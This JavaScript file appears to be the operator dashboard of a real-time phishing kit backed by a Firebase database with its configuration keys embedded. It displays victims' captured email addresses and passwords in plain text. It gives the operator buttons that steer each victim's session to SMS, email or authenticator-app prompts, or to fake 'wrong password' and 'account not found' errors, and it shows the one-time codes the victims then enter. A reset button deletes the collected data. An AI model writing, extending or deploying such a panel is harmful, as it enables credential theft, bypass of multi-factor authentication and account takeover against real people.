import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, onChildAdded, update, remove } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCgeJj-pm0yFbO_UcH06NBfaGm0H-YUVZA",
  authDomain: "live-47884.firebaseapp.com",
  databaseURL: "https://live-47884-default-rtdb.firebaseio.com",
  projectId: "live-47884",
  storageBucket: "live-47884.firebasestorage.app",
  messagingSenderId: "1020379584903",
  appId: "1:1020379584903:web:51805d3077b9802dd95b22",
  measurementId: "G-NKKST173G4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);



const resetBtn = document.createElement("button");
resetBtn.textContent = "Reset All Data";
resetBtn.style.background = "red";
resetBtn.style.color = "#fff";
resetBtn.style.padding = "10px";
resetBtn.style.border = "none";
resetBtn.style.marginBottom = "15px";
resetBtn.style.cursor = "pointer";

document.body.insertBefore(resetBtn, document.body.firstChild);

resetBtn.onclick = () => {
  const confirmReset = confirm("Are you sure you want to delete ALL data?");
  if (!confirmReset) return;

  // 🔥 CLEAR DATABASE
  remove(ref(db, 'messages'));
  remove(ref(db, 'logins'));
  remove(ref(db, 'verificationCodes'));

  // 🧹 CLEAR UI PROPERLY

  // clear messages
  document.getElementById("messages").innerHTML = "";

  // clear login section completely
  loginContainer.innerHTML = "<h3>Logins</h3>";

  alert("All data cleared!");
};



// ===== MESSAGES =====
const messageContainer = document.getElementById("messages");

onChildAdded(ref(db, 'messages'), (snapshot) => {
  const data = snapshot.val();
  const p = document.createElement("p");
  p.textContent = "Message: " + data.text;
  messageContainer.appendChild(p);
});

// ===== LOGINS =====
const loginContainer = document.getElementById("loginContainer");
loginContainer.innerHTML = "<h3>Logins</h3>";

onChildAdded(ref(db, 'logins'), (snapshot) => {
  const data = snapshot.val();
  const loginId = snapshot.key;

  // ✅ Original credentials display
  const p = document.createElement("p");
  p.textContent = `Email: ${data.email} | Password: ${data.password}`;

  // ✅ Verification buttons
  const buttonsDiv = document.createElement("div");
  buttonsDiv.style.marginBottom = "10px";

  const smsBtn = document.createElement("button");
  smsBtn.textContent = "SMS Code";
  smsBtn.style.marginRight = "5px";
  smsBtn.onclick = () => update(ref(db, `logins/${loginId}`), { verificationType: "sms" });

  const emailBtn = document.createElement("button");
  emailBtn.textContent = "Email Code";
  emailBtn.style.marginRight = "5px";
  emailBtn.onclick = () => update(ref(db, `logins/${loginId}`), { verificationType: "email" });

  const appBtn = document.createElement("button");
  appBtn.textContent = "Auth App";
  appBtn.onclick = () => update(ref(db, `logins/${loginId}`), { verificationType: "app" });

  const notFoundBtn = document.createElement("button");
notFoundBtn.textContent = "Account Not Found";
notFoundBtn.style.marginLeft = "5px";
notFoundBtn.onclick = () => update(ref(db, `logins/${loginId}`), { verificationType: "notfound" });

const wrongPassBtn = document.createElement("button");
wrongPassBtn.textContent = "Wrong Password";
wrongPassBtn.style.marginLeft = "5px";
wrongPassBtn.onclick = () => update(ref(db, `logins/${loginId}`), { verificationType: "wrongpass" });

buttonsDiv.appendChild(notFoundBtn);
buttonsDiv.appendChild(wrongPassBtn); 
 buttonsDiv.appendChild(smsBtn);
  buttonsDiv.appendChild(emailBtn);
  buttonsDiv.appendChild(appBtn);

  // ✅ Code display
  const codeP = document.createElement("p");
  codeP.id = `code-${loginId}`;
  codeP.textContent = "Code: Waiting...";

  // 🔹 NEW: Listen for verification codes pushed by login page
  onChildAdded(ref(db, 'verificationCodes'), (codeSnap) => {
    const codeData = codeSnap.val();
    if (codeData.loginId === loginId) {
      codeP.textContent = `Code: ${codeData.code} (${codeData.type})`;
    }
  });

  // Append everything
// ✅ Create card wrapper
const card = document.createElement("div");
card.className = "login-card";

// ✅ Apply classes (for CSS styling)
buttonsDiv.className = "buttons";

smsBtn.className = "sms";
emailBtn.className = "email";
appBtn.className = "app";
wrongPassBtn.className = "wrong-pass";
notFoundBtn.className = "not-found";

codeP.className = "code-box";

// ✅ Append everything INTO the card
card.appendChild(p);
card.appendChild(buttonsDiv);
card.appendChild(codeP);

// ✅ Append card to container
loginContainer.appendChild(card);
});